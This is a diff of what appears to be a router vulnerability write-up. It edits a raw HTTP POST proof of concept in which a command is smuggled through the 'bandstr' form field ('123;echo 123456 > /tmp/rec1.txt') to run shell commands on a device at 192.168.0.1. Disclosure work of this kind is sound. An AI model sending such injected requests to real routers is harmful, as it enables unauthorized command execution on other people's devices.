@@ -39,19 +39,21 @@ Accept-Encoding: gzip, deflate
 
 Content-Type: application/x-www-form-urlencoded
 
-Content-Length: 146
+Content-Length: 163
 
 Origin: http://192.168.0.1
 
 Connection: close
 
-Referer: http://192.168.0.1/map_del_device
+Referer: http://192.168.0.1/multi_ap_popup_client_details.htm
 
 Upgrade-Insecure-Requests: 1
 
 
 
-sessionCheck=5ef3b954a1316eeedf1d36330046c0ca&submit-url=%2FformMapDelDevice.htm&macstr=123&clientoff=no&bandstr=123;echo%20123456%20>/tmp/rec1.txt
+
+
+sessionCheck=eac3d25a37ff88c5d813f312586baec9&submit-url=%2Fmulti_ap_popup_client_details.htm&macstr=123&clientoff=no&bandstr=123;echo%20123456%20> /tmp/rec1.txt
 ```
 ![alt text](./img/image.png)
 
